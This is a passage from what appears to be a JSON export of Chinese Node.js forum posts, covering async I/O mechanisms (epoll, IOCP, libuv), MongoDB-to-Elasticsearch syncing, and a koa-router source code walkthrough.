href=\"#%E6%98%BE%E5%BC%8F%E7%9A%84%E5%BC%82%E6%AD%A5io\">显式的异步I/O</a></li>\n</ul>\n<h1>异步I/O与非阻塞I/O</h1>\n<p>异步I/O在Node中最为广泛，但是这并非Node原创</p>\n<p>Node介绍时，异步，非阻塞和回调通常一起推介出来。异步和非阻塞听起来似乎是一回事，且从实际效果来看，都实现了并行I/O的效果。但是从计算机内核来说，异步/同步和阻塞/非阻塞其实是两回事。</p>\n<p>操作系统内核对于I/O只有阻塞/非阻塞。当调用阻塞I/O时，那么应用程序只有等待I/O完成返回结果。</p>\n<p>阻塞I/O的一个特点就是，需要系统内核完成所有操作才算调用结束。例如读取磁盘上的一个文件，需要系统内核完成磁盘寻道，读取数据，复制数据到内存中，才算整个调用结束。</p>\n<p>阻塞I/O会使CPU进行等待，CPU的性能得不到充分利用，为了提升CPU的使用性能，内核提供了非阻塞I/O，区别在于调用后立马返回结果。</p>\n<p>阻塞I/O的调用过程\n<img src=\"http://resource.halu886.cn/images/async-io-2/1.png?x-oss-process=style/halu-blog-watermark\" alt=\"1\"></p>\n<p>非阻塞I/O的调用过程\n<img src=\"http://resource.halu886.cn/images/async-io-2/2.png?x-oss-process=style/halu-blog-watermark\" alt=\"2\"></p>\n<p>操作系统把任意支持输入输出设备都抽象成文件，应用程序要对文件操作时，需要获取文件操作符作为与系统内核的凭证。如果应用程序需要调用I/O，需要先打开文件描述符，再通过文件描述符进行文件读写。阻塞I/O的区别是完成整个获取数据的过程再返回，然而非阻塞I/O则不带数据直接返回，之后在通过文件操作符进行读取。</p>\n<p>非阻塞I/O直接返回，CPU时间片可以用来处理其他事物，此时的性能是明显的。</p>\n<p>非阻塞I/O也存在一个问题，当非阻塞I/O返回后，结果不是业务层需要的数据，这个时候就需要不停的确认I/O是否完成，这个就叫做<strong>轮询</strong>技术。</p>\n<p>任意技术并非完美，阻塞I/O造成了CPU等待浪费，而轮询则会导致CPU资源的浪费，那么我们来看一下如何优化轮询减小轮询所造成的CPU的浪费。</p>\n<h2>read</h2>\n<p>这是性能最低的一种方式，通过重复调用检查I/O的状态来完成完整数据的读取，在获取完整数据时，CPU一直耗用再等待上。\n<img src=\"http://resource.halu886.cn/images/async-io-2/3.png?x-oss-process=style/halu-blog-watermark\" alt=\"3\"></p>\n<h2>select</h2>\n<p>基于read的进行一种优化，通过文件描述符进行的事件状态进行判断。不过这有一个限制，它是由一个1024位数组来存储状态的，所以最多存储1024个文件描述符\n<img src=\"http://resource.halu886.cn/images/async-io-2/4.png?x-oss-process=style/halu-blog-watermark\" alt=\"4\"></p>\n<h2>poll</h2>\n<p>基于select进行优化的方案，采用链表的思路进行存储文件描述符，并且避免了没有必要的检查。但是当文件描述符比较多时，性能还是比较低效。\n<img src=\"http://resource.halu886.cn/images/async-io-2/5.png?x-oss-process=style/halu-blog-watermark\" alt=\"5\"></p>\n<h2>epoll</h2>\n<p>该方案是Linux下性能最高的方案，当进入到轮询时，没有检查到I/O事件时，将会进行休眠，直至事件发送将它唤醒。它真实的利用事件通知，执行回调的方法，而不是遍历查询。所以不会浪费CPU，不会浪费CPU，执行效率较高。\n<img src=\"http://resource.halu886.cn/images/async-io-2/6.png?x-oss-process=style/halu-blog-watermark\" alt=\"6\"></p>\n<h2>kqueue</h2>\n<p>该方案与epoll类似，不过只在FreeBSD系统下存在</p>\n<p>轮询机制能够确保非阻塞I/O获取完整数据，但是对于应用程序而言，仍是同步I/O,需要I/O完成读取读取所有数据才算完成，在这个过程中，CPU要么在轮询的过程中或者休眠的过程中。结论还是不够好。</p>\n<h1>理想的非阻塞异步I/O</h1>\n<p>尽管epoll已经降低了CPU的耗用，但是休眠期间CPU几乎是闲置的，对于线程来说，CPU的利用率并不高。</p>\n<p>我们期待的异步I/O是由应用程序进行发起非阻塞调用，然后直接处理下一件任务，然后I/O完成后通过信号或回调返回给应用程序。</p>\n<p><img src=\"http://resource.halu886.cn/images/async-io-2/7.png?x-oss-process=style/halu-blog-watermark\" alt=\"7\">\nLinux存在一种原生的异步I/O方式（AIO）就是通过信号和回调来传递数据,但是仅支持内核I/O中的O_DIRECT方式读取，导致无法利用系统缓存。</p>\n<h1>显式的异步I/O</h1>\n<p>实现异步I/O也并非难事，如果是多线程的话又是另外一番风景。通过部分线程使用阻塞I/O或者非阻塞I/O加轮询技术进行读取数据，再用一个进程作为计算进程，最后再通过进程间通信实现异步I/O。</p>\n<p><img src=\"http://resource.halu886.cn/images/async-io-2/8.png?x-oss-process=style/halu-blog-watermark\" alt=\"8\">\nglibc采用的就是通过线程池模拟异步I/O，但是存在一些难以忍受的bug，不推荐使用。libev的作者实现了一个异步I/O：libeio。libeio实际上还是线程池与阻塞I/O模拟异步I/O。最初Node在*nix平台下libeio配合libev实现异步I/O。在Nodev0.9.3中，自行实现了线程池来完成异步I/O。</p>\n<p>另一种方案则是windows下的IOCP，在某种程度是一种理想的异步I/O方案，调用异步方法，等待I/O完成后的通知，执行回调，无需考虑轮询。但是本质上也是线程池加阻塞I/O的，不过线程池由系统内核接管。</p>\n<p>IOCP和NodeJs的异步I/O调用模型相似，所以在Windows中采用IOCP实现异步I/O。</p>\n<p>由于Windows平台与*nix平台下的差异，Node提供了libuv作为抽象封装层保证上层Node.js与自定义线程池或IOCP各自独立。在编译时，选择性的将win目录下或者unix下的源文件编译进目标程序中\n<img src=\"http://resource.halu886.cn/images/async-io-2/9.png?x-oss-process=style/halu-blog-watermark\" alt=\"9\"></p>\n<p>强调一点，在*nix，任何计算机资源都抽象为文件。磁盘文件，硬件，套接字等等。<br>\n另外一点，我们所说的Node为单线程，指的是Javascript执行在单线程中，但是异步I/O另有线程池。</p>\n<blockquote>\n<p>以上知识点均来自&lt;&lt;深入浅出Node.js&gt;&gt;，更多细节建议阅读书籍:-)</p>\n</blockquote>\n</div>","title":"浅谈NodeJs异步I/O-2","last_reply_at":"2019-03-30T11:41:40.738Z","good":false,"top":false,"reply_count":0,"visit_count":402,"create_at":"2019-03-30T11:41:40.738Z","author":{"loginname":"halu886","avatar_url":"https://avatars1.githubusercontent.com/u/22374024?v=4&s=120"}},{"id":"5c9887dc00bcfd7eb2be5e34","author_id":"573212537abbbd520cb244b3","tab":"ask","content":"<div class=\"markdown-text\"><p>目前是用 bd 自带的 watch 监听增改事件,  然后同步到 es. 但是服务器挂掉之后就没发同步了, 会出现数据不一致的情况.</p>\n<p>有什么方案可以优雅得解决一下吗?</p>\n<p>我找到一种方案: MongoDB =&gt; Kafka =&gt; ElasticSearch\n搞了一下发现数据是可以推过去, 但是到 es 的数据结构不行.   我考虑改成 MongoDB =&gt; Kafka =&gt; Node.js =&gt; ElasticSearch  自己处理后推给 es;</p>\n<pre class=\"prettyprint language-json\"><code>{\n    &quot;took&quot;: 5,\n    &quot;timed_out&quot;: false,\n    &quot;_shards&quot;: {\n        &quot;total&quot;: 5,\n        &quot;successful&quot;: 5,\n        &quot;skipped&quot;: 0,\n        &quot;failed&quot;: 0\n    },\n    &quot;hits&quot;: {\n        &quot;total&quot;: 4,\n        &quot;max_score&quot;: 1,\n        &quot;hits&quot;: [\n            {\n                &quot;_index&quot;: &quot;estest&quot;,\n                &quot;_type&quot;: &quot;customer&quot;,\n                &quot;_id&quot;: &quot;estest+0+0&quot;,\n                &quot;_score&quot;: 1,\n                &quot;_source&quot;: {\n                    &quot;after&quot;: &quot;{\\&quot;_id\\&quot; : {\\&quot;$oid\\&quot; : \\&quot;5c9c7b471bc46c008b81ec80\\&quot;},\\&quot;1\\&quot; : 1226}&quot;,\n                    &quot;patch&quot;: null,\n                    &quot;source&quot;: {\n                        &quot;version&quot;: &quot;0.9.3.Final&quot;,\n                        &quot;connector&quot;: &quot;mongodb&quot;,\n                        &quot;name&quot;: &quot;yuwenyun&quot;,\n                        &quot;rs&quot;: &quot;mgset-13045511&quot;,\n                        &quot;ns&quot;: &quot;yuwenyun.estest&quot;,\n                        &quot;sec&quot;: 1553762695,\n                        &quot;ord&quot;: 1,\n                        &quot;h&quot;: 5437490261080768344,\n                        &quot;initsync&quot;: true\n                    },\n                    &quot;op&quot;: &quot;r&quot;,\n                    &quot;ts_ms&quot;: 1553762704918\n                }\n            },\n            {\n                &quot;_index&quot;: &quot;estest&quot;,\n                &quot;_type&quot;: &quot;customer&quot;,\n                &quot;_id&quot;: &quot;estest+0+3&quot;,\n                &quot;_score&quot;: 1,\n                &quot;_source&quot;: {\n                    &quot;after&quot;: null,\n                    &quot;patch&quot;: &quot;{\\&quot;_id\\&quot; : {\\&quot;$oid\\&quot; : \\&quot;5c9c7b471bc46c008b81ec80\\&quot;},\\&quot;1\\&quot; : 1226447}&quot;,\n                    &quot;source&quot;: {\n                        &quot;version&quot;: &quot;0.9.3.Final&quot;,\n                        &quot;connector&quot;: &quot;mongodb&quot;,\n                        &quot;name&quot;: &quot;yuwenyun&quot;,\n                        &quot;rs&quot;: &quot;mgset-13045511&quot;,\n                        &quot;ns&quot;: &quot;yuwenyun.estest&quot;,\n                        &quot;sec&quot;: 1553764732,\n                        &quot;ord&quot;: 1,\n                        &quot;h&quot;: -236075833439367192,\n                        &quot;initsync&quot;: false\n                    },\n                    &quot;op&quot;: &quot;u&quot;,\n                    &quot;ts_ms&quot;: 1553764741906\n                }\n            },\n            {\n                &quot;_index&quot;: &quot;estest&quot;,\n                &quot;_type&quot;: &quot;customer&quot;,\n                &quot;_id&quot;: &quot;estest+0+1&quot;,\n                &quot;_score&quot;: 1,\n                &quot;_source&quot;: {\n                    &quot;after&quot;: null,\n                    &quot;patch&quot;: &quot;{\\&quot;_id\\&quot; : {\\&quot;$oid\\&quot; : \\&quot;5c9c7b471bc46c008b81ec80\\&quot;},\\&quot;1\\&quot; : 12264}&quot;,\n                    &quot;source&quot;: {\n                        &quot;version&quot;: &quot;0.9.3.Final&quot;,\n                        &quot;connector&quot;: &quot;mongodb&quot;,\n                        &quot;name&quot;: &quot;yuwenyun&quot;,\n                        &quot;rs&quot;: &quot;mgset-13045511&quot;,\n                        &quot;ns&quot;: &quot;yuwenyun.estest&quot;,\n                        &quot;sec&quot;: 1553764557,\n                        &quot;ord&quot;: 1,\n                        &quot;h&quot;: -6372310413316992824,\n                        &quot;initsync&quot;: false\n                    },\n                    &quot;op&quot;: &quot;u&quot;,\n                    &quot;ts_ms&quot;: 1553764566566\n                }\n            },\n            {\n                &quot;_index&quot;: &quot;estest&quot;,\n                &quot;_type&quot;: &quot;customer&quot;,\n                &quot;_id&quot;: &quot;estest+0+2&quot;,\n                &quot;_score&quot;: 1,\n                &quot;_source&quot;: {\n                    &quot;after&quot;: null,\n                    &quot;patch&quot;: &quot;{\\&quot;_id\\&quot; : {\\&quot;$oid\\&quot; : \\&quot;5c9c7b471bc46c008b81ec80\\&quot;},\\&quot;1\\&quot; : 122644}&quot;,\n                    &quot;source&quot;: {\n                        &quot;version&quot;: &quot;0.9.3.Final&quot;,\n                        &quot;connector&quot;: &quot;mongodb&quot;,\n                        &quot;name&quot;: &quot;yuwenyun&quot;,\n                        &quot;rs&quot;: &quot;mgset-13045511&quot;,\n                        &quot;ns&quot;: &quot;yuwenyun.estest&quot;,\n                        &quot;sec&quot;: 1553764691,\n                        &quot;ord&quot;: 1,\n                        &quot;h&quot;: -250322674294173573,\n                        &quot;initsync&quot;: false\n                    },\n                    &quot;op&quot;: &quot;u&quot;,\n                    &quot;ts_ms&quot;: 1553764701044\n                }\n            }\n        ]\n    }\n}\n</code></pre></div>","title":"求推荐 MongoDB 同步到 ElasticSearch 的技术方案","last_reply_at":"2019-03-30T11:07:30.523Z","good":false,"top":false,"reply_count":7,"visit_count":727,"create_at":"2019-03-25T07:48:44.578Z","author":{"loginname":"dlyt","avatar_url":"https://avatars0.githubusercontent.com/u/18431616?v=4&s=120"}},{"id":"59f576b2508fccca5420f335","author_id":"515005e9604b3d512109bb17","tab":"share","content":"<div class=\"markdown-text\"><blockquote>\n<p><a href=\"https://www.zhihu.com/lives/907210790807949312\">点我</a>进入 Live，时间是 11 月 27 日晚 7 点。</p>\n</blockquote>\n<p>Node.js 本身其实是很简单的，正如社区里面一直传的一样，它只是一个胶水层。</p>\n<p>所以，这么简单的一个东西到底有哪些地方是值得我们学习的呢？以及，为了能好好跟它玩耍，我们还需要学习哪些周边的姿势呢？</p>\n<p>这些就会在本场 Live 中已我个人的观点进行解说。</p>\n<blockquote>\n<p><strong>注</strong>：本次 Live 与我在 GitChat 上的内容大抵相似，若已参与那场则可略过本场。</p>\n</blockquote>\n<p>顺便附送一个二维码：</p>\n<p><img src=\"//static.cnodejs.org/FtvGlEnsWQG7m59llqel4XQVFg3T\" alt=\"群二维码\"></p>\n</div>","title":"开场知乎 Live，一起讨论下当我们在学习 Node.js 的时候，我们在学习什么","last_reply_at":"2019-03-30T03:56:25.297Z","good":false,"top":false,"reply_count":6,"visit_count":2160,"create_at":"2017-10-29T06:35:30.514Z","author":{"loginname":"XadillaX","avatar_url":"https://avatars3.githubusercontent.com/u/2842176?v=4&s=120"}},{"id":"5c9ec83899e62a362ff415b4","author_id":"5c9ec62999e62a362ff415a8","tab":"share","content":"<div class=\"markdown-text\"><p>地址：<a href=\"http://www.ckminder.top/\">ckminder 导图</a>\n<img src=\"//static.cnodejs.org/FgLJRNvJTqp2Aa5aHDXzf0zUU_d9\" alt=\"QQ图片20190330093617.png\">\n<img src=\"//static.cnodejs.org/FkBhSJ4wu9xAAnXtXzBBAFF5-Z8X\" alt=\"QQ图片20190330220346.png\"></p>\n<p>测试版，目前还正在开发</p>\n</div>","title":"[ckminder 导图]基于egg.js/zrender.js开发的思维导图网站","last_reply_at":"2019-03-30T01:36:56.876Z","good":false,"top":false,"reply_count":0,"visit_count":366,"create_at":"2019-03-30T01:36:56.876Z","author":{"loginname":"Jugging","avatar_url":"https://avatars0.githubusercontent.com/u/18719494?v=4&s=120"}},{"id":"5c2dd1855bf06c5e7e3f0cce","author_id":"59aa89ea9e95202d08c91ed3","tab":"ask","content":"<div class=\"markdown-text\"><p>如全CSS实现的浮动菜单，手动实现虽说不难，但数量多的话容易出错</p>\n</div>","title":"大家都是用什么工具做前端设计？","last_reply_at":"2019-03-29T12:57:24.824Z","good":false,"top":false,"reply_count":5,"visit_count":1285,"create_at":"2019-01-03T09:10:29.784Z","author":{"loginname":"xinggsf","avatar_url":"https://avatars3.githubusercontent.com/u/13033798?v=4&s=120"}},{"id":"5c6ba967b8913c5110b0c3fe","author_id":"5b7cc310632c7f422e5b8066","tab":"ask","content":"<div class=\"markdown-text\"><p>这都node11，12版本了，找了一圈还是没有简单直接的用import方法，什么时候能原生支持啊</p>\n</div>","title":"node中import老大难问题","last_reply_at":"2019-03-29T08:36:22.307Z","good":false,"top":false,"reply_count":28,"visit_count":1720,"create_at":"2019-02-19T06:59:51.500Z","author":{"loginname":"DuJiming","avatar_url":"https://avatars2.githubusercontent.com/u/36750680?v=4&s=120"}},{"id":"5b13c12157137f22415c4892","author_id":"5a9d2f0989a57ad544fa4279","tab":"share","content":"<div class=\"markdown-text\"><p>koa 框架一直都保持着简洁性, 它只对 node 的 HTTP 模块进行了封装, 而在真正实际使用, 我们还需要更多地像路由这样的模块来构建我们的应用, 而 koa-router 是常用的 koa 的路由库. 这里通过解析 koa-router 的源码来达到深入学习的目的.\n&lt;!-- more --&gt;</p>\n<h2>深入浅出路由模块</h2>\n<p>在 node 原生里面, 如果我们需要实现路由功能, 那么就可以像下面这样编写代码:</p>\n<pre class=\"prettyprint\"><code>const http = require(&#x27;http&#x27;);\nconst { parse } = require(&#x27;url&#x27;);\n\nconst server = http.createServer((req, res) =&gt; {\n    let { pathname } = parse(req.url);\n    \n    if (pathname === &#x27;&#x2F;&#x27;) {\n        res.end(&#x27;index page&#x27;);\n    } else if (pathname === &#x27;&#x2F;test&#x27;) {\n        res.end(&#x27;test page&#x27;);\n    } else {\n        res.end(&#x27;router is not found&#x27;);\n    }\n});\n\nserver.listen(3000);\n</code></pre><p>上面的代码通过解析原生 <em>request IncomingMessage</em> 的 url 属性, 利用 <em>if…else</em> 判断路径返回不同的结果.\n但是上面的代码缺点也很明显, 如果路由过多, <em>if…else</em> 的分支也会越庞大, 不利于代码的维护与多人合作.因此,我们需要一个特定的路由模块来统一地模块化地解决路由功能的问题.\n如果是使用 koa-router 的话, 那么可以借助下面的代码来简单建立一个 koa-router 库的使用 demo:</p>\n<pre class=\"prettyprint\"><code>const Koa = require(&#x27;koa&#x27;);\nconst KoaRouter = require(&#x27;koa-router&#x27;);\n\nconst app = new Koa();\n&#x2F;&#x2F; 创建 router 实例对象\nconst router = new KoaRouter();\n\n&#x2F;&#x2F;注册路由\nrouter.get(&#x27;&#x2F;&#x27;, async (ctx, next) =&gt; {\n  console.log(&#x27;index&#x27;);\n  ctx.body = &#x27;index&#x27;;\n});\n\napp.use(router.routes());  &#x2F;&#x2F; 添加路由中间件\napp.use(router.allowedMethods()); &#x2F;&#x2F; 对请求进行一些限制处理\n\napp.listen(3000);\n</code></pre><p>运行上面的代码, 访问根路由 ‘/’ 我们可以看到返回数据为 ‘index’, 这说明路由已经基本生效了.\n我们来看上面的代码, 使用 koa-router 第一步就是新建一个 router 实例对象:</p>\n<pre class=\"prettyprint\"><code>const router = new KoaRouter();\n</code></pre><p>然后在构建应用的时候, 我们的首要目标就是创建多个 CGI 接口以适配不同的业务需求, 那么接下来就需要注册对应的路由:</p>\n<pre class=\"prettyprint\"><code>router.get(&#x27;&#x2F;&#x27;, async (ctx, next) =&gt; {\n  console.log(&#x27;index&#x27;);\n  ctx.body = &#x27;index&#x27;;\n});\n</code></pre><p>上面的示例使用了 GET 方法来进行注册根路由, 实际上不仅可以使用 GET 方法, 还可以使用 POST, DELETE, PUT 等等\nnode 支持的方法.\n然后为了让 koa 实例使用我们处理后的路由模块, 我们需要使用 routes 方法将路由加入到应用全局的中间件函数中:</p>\n<pre class=\"prettyprint\"><code>app.use(router.routes());  &#x2F;&#x2F; 添加路由中间件\napp.use(router.allowedMethods()); &#x2F;&#x2F; 对请求进行一些限制处理\n</code></pre><h2>源码架构与解析</h2>\n<p>通过上面的代码, 我们已经知道了 koa-router 的简单使用, 接下来我们需要深入到代码中, 理解它是怎么做到匹配从\n客户端传过来的请求并跳转执行对应的逻辑的.在此之前我们先看一下代码的结构图:\n<img src=\"http://ofsur12wi.bkt.clouddn.com/%E7%BB%93%E6%9E%84%E5%9B%BE.png\" alt></p>\n<h3>Router &amp; Layer</h3>\n<p>第一步, 我们需要新建一个 Router 的实例对象, 而对于一个 Router 的实例来说理解其属性是至关重要的.</p>\n<pre class=\"prettyprint\"><code>function Router(opts) {\n  if (!(this instanceof Router)) {\n    return new Router(opts);\n  }\n\n  this.opts = opts || {};\n  this.methods = this.opts.methods || [\n    &#x27;HEAD&#x27;,\n    &#x27;OPTIONS&#x27;,\n    &#x27;GET&#x27;,\n    &#x27;PUT&#x27;,\n    &#x27;PATCH&#x27;,\n    &#x27;POST&#x27;,\n    &#x27;DELETE&#x27;\n  ];\n\n  this.params = {};\n  this.stack = [];\n};\n</code></pre><p>可以看到, 实际有用的属性不过 3 个, 分别是 methods 数组, params 对象, stack 数组. methods 数组存放的是允许\n使用的 HTTP 方法名, 会在 Router.prototype.allowedMethods 方法中使用, 我们在创建 Router 实例的时候可以进行配置, 允许使用哪些方法. 而对于 params 对象它存储的是键为参数名与值为对应的参数校验函数, 这样是为了通过在全局存储参数的校验函数, 方便在注册路由的时候为路由的中间件函数数组添加校验函数. 对于 stack 数组, 则是存储每一个路由, 也就是 Layer 的实例对象, 每一个路由都相当于一个 Layer 实例对象.\n对于 Layer 类来说, 创建一个实例对象用于管理每个路由:</p>\n<pre class=\"prettyprint\"><code>function Layer(path, methods, middleware, opts) {\n  this.opts = opts || {};\n  &#x2F;&#x2F; 路由命名\n  this.name = this.opts.name || null;\n  &#x2F;&#x2F; 路由对应的方法\n  this.methods = [];\n  &#x2F;&#x2F; 路由参数名数组\n  this.paramNames = [];\n  &#x2F;&#x2F; 路由处理中间件数组\n  this.stack = Array.isArray(middleware) ? middleware : [middleware];\n  &#x2F;&#x2F; 存储路由方法\n  methods.forEach(function(method) {\n    var l = this.methods.push(method.toUpperCase());\n    if (this.methods[l-1] === &#x27;GET&#x27;) {\n      this.methods.unshift(&#x27;HEAD&#x27;);\n    }\n  }, this);\n\n  &#x2F;&#x2F; 将添加的回调处理中间件函数添加到 Layer 实例对象的 stack 数组中\n  this.stack.forEach(function(fn) {\n    var type = (typeof fn);\n    if (type !== &#x27;function&#x27;) {\n      throw new Error(\n        methods.toString() + &quot; &#96;&quot; + (this.opts.name || path) +&quot;&#96;: &#96;middleware&#96; &quot;\n        + &quot;must be a function, not &#96;&quot; + type + &quot;&#96;&quot;\n      );\n    }\n  }, this);\n\n  this.path = path;\n  this.regexp = pathToRegExp(path, this.paramNames, this.opts);\n\n  debug(&#x27;defined route %s %s&#x27;, this.methods, this.opts.prefix + this.path);\n};\n</code></pre><p>我们可以看到, 对于 Layer 的实例对象, 核心的逻辑还是在于将 path 转化为正则表达式用于匹配请求的路由,  然后将路由的处理中间件添加到 Layer 的 stack 数组中. 注意这里的 stack 和 Router 里面的 stack 是不一样的, Router 的 stack 数组是存放每个路由对应的 Layer 实例对象的, 而 Layer 实例对象里面的 stack 数组是存储每个路由的处理函数中间件的, 换言之, 一个路由可以添加多个处理函数.\n<img src=\"http://ofsur12wi.bkt.clouddn.com/router&amp;layer.png\" alt></p>\n<h3>method 相关函数</h3>\n<p>所谓 method 就是 HTTP 协议中或者说是在 node 中支持的 HTTP 请求方法.其实我们可以通过打印 node 中的 HTTP 的方法来查看 node 支持的 HTTP method:</p>\n<pre class=\"prettyprint\"><code>require(&#x27;http&#x27;).METHODS; &#x2F;&#x2F; [&#x27;ACL&#x27;, ...., &#x27;GET&#x27;, &#x27;POST&#x27;, &#x27;PUT&#x27;, ...]\n</code></pre><p>在 koa-router 里面的体现就是我们可以通过在 router 实例对象上调用对应的方法函数来注册对应的 HTTP 方法的路由而且每个方法的核心逻辑都类似, 就是将传入的路由路径与对应的回调函数绑定, 所以我们可以遍历一个方法数组来快速构建原型的 method 方法:</p>\n<pre class=\"prettyprint\"><code>methods.forEach(function (method) {\n  Router.prototype[method] = function (name, path, middleware) {\n    var middleware;\n    &#x2F;&#x2F; 判断有没有传入 name 参数, 如果有则处理参数个数问题\n    if (typeof path === &#x27;string&#x27; || path instanceof RegExp) {\n      middleware = Array.prototype.slice.call(arguments, 2);\n    } else {\n      middleware = Array.prototype.slice.call(arguments, 1);\n      path = name;\n      name = null;\n    }\n    &#x2F;&#x2F; 注册路由\n    this.register(path, [method], middleware, {\n      name: name\n    });\n\n    return this;\n  };\n});\n</code></pre><p>上面函数中先判断 path 是否是字符串或者正则表达式是因为注册路由的时候还可以为路由进行命名(命名空间方便管理), 然后准确地获取回调的函数数组(注册路由可以接收多个回调), 这样如果匹配到某个路由, 回调函数数组中的函数就会依次执行. 留意到每个方法都会返回对象本身, 也就是说注册路由的时候是可以支持<strong>链式</strong>调用的.\n此外, 我们可以看到, 每个方法的核心其实还是 register 函数, 所以我们下面看看 register 函数的逻辑.</p>\n<h3>Router.prototype.register</h3>\n<p>register 是注册路由的核心函数, 举个例子, 如果我们需要注册一个路径为 <em>‘/test’</em> 的接收 GET 方法的路由, 那么:</p>\n<pre class=\"prettyprint\"><code>router.get(&#x27;&#x2F;test&#x27;, async (ctx, next) =&gt; {});\n</code></pre><p>其实它相当于下面这段代码:</p>\n<pre class=\"prettyprint\"><code>router.register(&#x27;&#x2F;test&#x27;, [&#x27;GET&#x27;], [async (ctx, next) =&gt; {}], { name: null });\n</code></pre><p>我们可以看到, 函数将路由作为第一个参数传入, 然后方法名放入到方法数组中作为第二个参数, 第三个函数是路由的回调数组, 其实每个路由注册的时候, 后面都可以添加很多个函数, 而这些函数都会被添加到一个数组里面, 如果被匹配到, 就会利用中间件机制来逐个执行这些函数. 最后一个函数是将路由的命名空间传入.\n这里避免篇幅过长, 不再陈列 register 函数的代码, 请移步 <a href=\"https://github.com/alexmingoia/koa-router/blob/master/lib/router.js#L537\">koa-router 源码仓库关于 register 函数部分</a> 查看.\nregister 函数的逻辑其实也很简单, 因为核心的代码全部都交由 Layer 类去完成了, register 函数只是负责处理 path 如果是数组的话那么需要递归调用 register 函数, 然后新建一个 Layer 类的实例对象, 并且检查在注册这个路由之间有没有注册过 param 路由参数校验函数, 如果有的话, 那么就使用 Layer.prototype.param 函数将校验函数加入到路由的中间件函数数组前面.</p>\n<h3>Router.prototype.match</h3>\n<p>通过上面的模块, 我们已经注册好了路由, 但是, 如果请求过来了, 请求是怎么匹配然后进行到相对应的处理函数去的呢? 答案就是利用 match 函数.先看一下 match 函数的代码:</p>\n<pre class=\"prettyprint\"><code>Router.prototype.match = function (path, method) {\n  &#x2F;&#x2F; 取所有路由 Layer 实例\n  var layers = this.stack;\n  var layer;\n  &#x2F;&#x2F; 匹配结果\n  var matched = {\n    path: [],\n    pathAndMethod: [],\n    route: false\n  };\n  &#x2F;&#x2F; 遍历路由 Router 的 stack 逐个判断\n  for (var len = layers.length, i = 0; i &lt; len; i++) {\n    layer = layers[i];\n\n    debug(&#x27;test %s %s&#x27;, layer.path, layer.regexp);\n    &#x2F;&#x2F; 这里是使用由路由字符串生成的正则表达式判断当前路径是否符合该正则\n    if (layer.match(path)) {\n      &#x2F;&#x2F; 将对应的 Layer 实例加入到结果集的 path 数组中\n      matched.path.push(layer);\n      &#x2F;&#x2F; 如果对应的 layer 实例中 methods 数组为空或者数组中有找到对应的方法\n      if (layer.methods.length === 0 || ~layer.methods.indexOf(method)) {\n        &#x2F;&#x2F; 将 layer 放入到结果集的 pathAndMethod 中\n        matched.pathAndMethod.push(layer);\n        &#x2F;&#x2F; 这里是用于判断是否有真正匹配到路由处理函数\n        &#x2F;&#x2F; 因为像 router.use(session()); 这样的中间件也是通过 Layer 来管理的, 它们的 methods 数组为空\n        if (layer.methods.length) matched.route = true;\n      }\n    }\n  }\n\n  return matched;\n};\n</code></pre><p>通过上面返回的结果集, 我们知道一个请求来临的时候, 我们可以使用正则来匹配路由是否符合, 然后在 path 数组或者 pathAndMethod 数组中找到对应的 Layer 实例对象.</p>\n<h3>Router.prototype.routes(middlewares)</h3>\n<p>如果根据一开始的 demo 例子, 在上面注册好了路由之后, 我们就可以使用 router.routes 来将路由模块添加到 koa 的中间件处理机制当中了. 由于 koa 的中间件插件是以一个函数的形式存在的, 所以 routes 函数返回值就是一个函数:</p>\n<pre class=\"prettyprint\"><code>Router.prototype.routes = Router.prototype.middleware = function () {\n  var router = this;\n\n  var dispatch = function dispatch(ctx, next) {\n    ...\n  };\n\n  dispatch.router = this;\n\n  return dispatch;\n};\n</code></pre><p>我们可以看到返回的 dispatch 函数在 routes 内部形成了一个闭包, 并且按照 koa 的中间件形式编写函数.对于 dispatch 函数内部逻辑就如下:</p>\n<pre class=\"prettyprint\"><code>var dispatch = function dispatch(ctx, next) {\n    debug(&#x27;%s %s&#x27;, ctx.method, ctx.path);\n    \n    var path = router.opts.routerPath || ctx.routerPath || ctx.path;\n    &#x2F;&#x2F; 根据 path 值取的匹配的路由 Layer 实例对象\n    var matched = router.match(path, ctx.method);\n    var layerChain, layer, i;\n    \n    if (ctx.matched) {\n      ctx.matched.push.apply(ctx.matched, matched.path);\n    } else {\n      ctx.matched = matched.path;\n    }\n    \n    ctx.router = router;\n    &#x2F;&#x2F; 如果没有匹配到对应的路由模块, 那么就直接跳过下面的逻辑\n    if (!matched.route) return next();\n    &#x2F;&#x2F; 取路径与方法都匹配了的 Layer 实例对象\n    var matchedLayers = matched.pathAndMethod\n    var mostSpecificLayer = matchedLayers[matchedLayers.length - 1]\n    ctx._matchedRoute = mostSpecificLayer.path;\n    if (mostSpecificLayer.name) {\n      ctx._matchedRouteName = mostSpecificLayer.name;\n    }\n    &#x2F;&#x2F; 构建路径对应路由的处理中间件函数数组\n    &#x2F;&#x2F; 这里的目的是在每个匹配的路由对应的中间件处理函数数组前添加一个用于处理\n    &#x2F;&#x2F; 对应路由的 captures, params, 以及路由命名的函数\n    layerChain = matchedLayers.reduce(function(memo, layer) {\n      memo.push(function(ctx, next) {\n        &#x2F;&#x2F; captures 是存储路由中参数的值的数组\n        ctx.captures = layer.captures(path, ctx.captures);\n        &#x2F;&#x2F; params 是一个对象, 键为参数名, 根据参数名可以获取路由中的参数值, 值从 captures 中拿\n        ctx.params = layer.params(path, ctx.captures, ctx.params);\n        ctx.routerName = layer.name;\n        return next();\n      });\n      return memo.concat(layer.stack);\n    }, []);\n    &#x2F;&#x2F; 使用 compose 模块将对应路由的处理中间件数组中的函数逐个执行\n    &#x2F;&#x2F; 当路由的处理函数中间件函数全部执行完, 再调用上一层级的 next 函数进入下一个中间件\n    return compose(layerChain)(ctx, next);\n};\n</code></pre><h3>Router.prototype.allowedMethod</h3>\n<p>对于 allowedMethod 方法来说, 它的作用就是用于处理请求的错误, 所以它作为路由模块的最后一个函数来执行.同样地, 它也是以一个 koa 的中间件插件函数的形式出现, 同样在函数内部形成了一个闭包:</p>\n<pre class=\"prettyprint\"><code>Router.prototype.allowedMethods = function (options) {\n  options = options || {};\n  var implemented = this.methods;\n\n  return function allowedMethods(ctx, next) {\n    ...\n  };\n};\n</code></pre><p>上面的代码很简单, 就是保存 Router 配置中允许的 HTTP 方法数组在闭包内部</p>\n<pre class=\"prettyprint\"><code>return function allowedMethods(ctx, next) {\n    &#x2F;&#x2F; 从这里可以看出, allowedMethods 函数是用于在中间件机制中处理返回结果的函数\n    &#x2F;&#x2F; 先执行 next 函数, next 函数返回的是一个 Promise 对象\n    return next().then(function() {\n      var allowed = {};\n      &#x2F;&#x2F; allowedMethods 函数的逻辑建立在 